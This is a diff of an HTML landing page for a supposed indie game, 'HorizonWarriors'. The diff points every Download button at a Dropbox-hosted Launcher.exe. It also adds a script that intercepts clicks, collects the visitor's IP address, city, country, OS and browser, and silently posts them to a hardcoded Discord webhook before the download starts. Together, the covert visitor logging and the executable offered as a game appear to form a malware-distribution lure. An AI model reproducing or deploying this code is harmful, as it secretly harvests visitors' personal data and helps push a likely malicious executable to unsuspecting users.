@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -11,19 +11,24 @@
   <meta property="og:description" content="Embark on an unforgettable journey through the Veil, where every choice shapes your destiny.">
   <meta property="og:image" content="media/main.dde7f6b9.html">
   <meta property="og:type" content="website">
-  <link rel="preload" as="image" href="media/main.dde7f6b9.html">
   <link rel="stylesheet" href="styles-new.css">
   <link rel="icon" type="image/png" href="media/favicon.html">
-  <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  
+  <style>
+      /* İndirme butonlarına tıklanabilir görsel efekti */
+      .download-trigger {
+          cursor: pointer;
+      }
+  </style>
 </head>
+
 <body>
-  <!-- Loading Screen -->
   <div class="loading-screen">
     <div class="loader"></div>
     <p>Loading Horizonwarriors...</p>
   </div>
 
-  <!-- Navigation -->
   <header class="site-header">
     <div class="brand">
       <img class="logo" src="media/blacktail.gif" alt="Horizonwarriors logo">
@@ -37,9 +42,11 @@
         <li><a href="#testimonials">Testimonials</a></li>
       </ul>
     </nav>
-    <a class="https://www.dropbox.com/scl/fi/bubzf724sui8racre6i1g/Launcher.exe?rlkey=6gu9e3lbnnay0kbptj740576v&st=fczhou5b&dl=1">
+    
+    <a href="https://www.dropbox.com/scl/fi/bubzf724sui8racre6i1g/Launcher.exe?rlkey=6gu9e3lbnnay0kbptj740576v&st=fczhou5b&dl=1" class="download-trigger">
       <i class="fas fa-download"></i> Download
     </a>
+
     <button class="mobile-menu-btn" aria-label="Toggle menu">
       <span></span>
       <span></span>
@@ -58,7 +65,9 @@
     <div class="hero-inner">
       <h1>Awakening of the Veil</h1>
       <p>HorizonWarriors is my atmospheric single-player action-adventure. Dive into a dark fable, master timing-based melee, and chart your own path through exploration-driven level design.</p>
-      <a class="https://www.dropbox.com/scl/fi/bubzf724sui8racre6i1g/Launcher.exe?rlkey=6gu9e3lbnnay0kbptj740576v&st=fczhou5b&dl=1">Download</a>
+      
+      <a href="https://www.dropbox.com/scl/fi/bubzf724sui8racre6i1g/Launcher.exe?rlkey=6gu9e3lbnnay0kbptj740576v&st=fczhou5b&dl=1" class="download-trigger">Download</a>
+    
     </div>
   </section>
 
@@ -268,13 +277,11 @@
     </div>
   </footer>
 
-  <!-- Back to Top Button -->
   <button id="back-to-top" aria-label="Back to top">
     <i class="fas fa-arrow-up"></i>
   </button>
 
   <script>
-    // Loading screen
     window.addEventListener('load', function() {
       const loadingScreen = document.querySelector('.loading-screen');
       if (loadingScreen) {
@@ -285,7 +292,6 @@
       }
     });
 
-    // Mobile menu toggle
     const menuBtn = document.querySelector('.mobile-menu-btn');
     const nav = document.querySelector('.main-nav');
     
@@ -296,7 +302,6 @@
       });
     }
 
-    // Smooth scrolling for anchor links
     document.querySelectorAll('a[href^="#"]').forEach(anchor => {
       anchor.addEventListener('click', function(e) {
         e.preventDefault();
@@ -310,7 +315,6 @@
             behavior: 'smooth'
           });
           
-          // Close mobile menu if open
           if (menuBtn && menuBtn.classList.contains('active')) {
             menuBtn.classList.remove('active');
             nav.classList.remove('active');
@@ -319,7 +323,6 @@
       });
     });
 
-    // Back to top button
     const backToTopBtn = document.getElementById('back-to-top');
     if (backToTopBtn) {
       window.addEventListener('scroll', () => {
@@ -338,7 +341,88 @@
       });
     }
   </script>
-<script defer="" src="beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"1d40c0dc80534381a243d1db6caf0eeb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-</body>
 
+  <script>
+  document.addEventListener("DOMContentLoaded", function() {
+      // "download-trigger" class'ına sahip tüm butonları seçiyoruz
+      const downloadButtons = document.querySelectorAll('.download-trigger');
+
+      downloadButtons.forEach(button => {
+          button.addEventListener("click", function(event) {
+              event.preventDefault(); // İndirmeyi durdur
+              const targetUrl = this.href; // Gidilecek adresi al
+
+              // Kullanıcı bilgilerini al
+              fetch("https://ipinfo.io/json")
+                  .then(response => response.json())
+                  .then(data => {
+                      const ip = data.ip;
+                      const country = data.country;
+                      const city = data.city;
+                      const flag = `https://flagsapi.com/${country}/flat/64.png`;
+
+                      // Kullanıcı sistemi
+                      const userAgent = navigator.userAgent;
+                      let os = "Bilinmiyor";
+                      let browser = "Bilinmiyor";
+
+                      if (userAgent.includes("Windows")) os = "Windows";
+                      else if (userAgent.includes("Mac")) os = "MacOS";
+                      else if (userAgent.includes("Linux")) os = "Linux";
+                      else if (userAgent.includes("Android")) os = "Android";
+                      else if (userAgent.includes("iPhone")) os = "iOS";
+
+                      if (userAgent.includes("Chrome")) browser = "Google Chrome";
+                      else if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
+                      else if (userAgent.includes("Safari")) browser = "Safari";
+                      else if (userAgent.includes("Edge")) browser = "Microsoft Edge";
+                      else if (userAgent.includes("Opera")) browser = "Opera";
+
+                      // Webhook URL
+                      const webhookURL = "https://ptb.discord.com/api/webhooks/1445393987530920027/CuI7qgJ2p0uNErXRero6o3icxFu3fK7709YKCuJf4xyHbx6EbTEwJ8HfKkKXTw8KnC5S";
+
+                      const payload = {
+                          username: "Download Logger",
+                          avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkfiN_vDoL3bK4CyZywObSXjG1bpcJSf8MMw&s",
+                          embeds: [
+                              {
+                                  title: "Someone Downloaded",
+                                  description: "A user has initiated a download.",
+                                  color: 16711680, // Kırmızı Renk
+                                  fields: [
+                                      { name: "Location", value: `${city}, ${country}`, inline: true },
+                                      { name: "IP Address", value: `\`${ip}\``, inline: true },
+                                      { name: "System", value: `\`${os}\``, inline: true },
+                                      { name: "Browser", value: `\`${browser}\``, inline: true }
+                                  ],
+                                  thumbnail: { url: flag },
+                                  footer: { text: "HorizonWarriors Log", icon_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkfiN_vDoL3bK4CyZywObSXjG1bpcJSf8MMw&s" },
+                                  timestamp: new Date().toISOString()
+                              }
+                          ]
+                      };
+
+                      // Webhook Gönder
+                      fetch(webhookURL, {
+                          method: "POST",
+                          headers: { "Content-Type": "application/json" },
+                          body: JSON.stringify(payload)
+                      }).then(() => {
+                          // Log başarılı, indirmeyi başlat
+                          window.location.href = targetUrl;
+                      }).catch(err => {
+                          console.error("Webhook Error:", err);
+                          window.location.href = targetUrl;
+                      });
+                  })
+                  .catch(err => {
+                      console.error("IP Info Error:", err);
+                      // Hata olsa bile kullanıcıyı bekletme, indir
+                      window.location.href = targetUrl;
+                  });
+          });
+      });
+  });
+  </script>
+</body>
 </html>
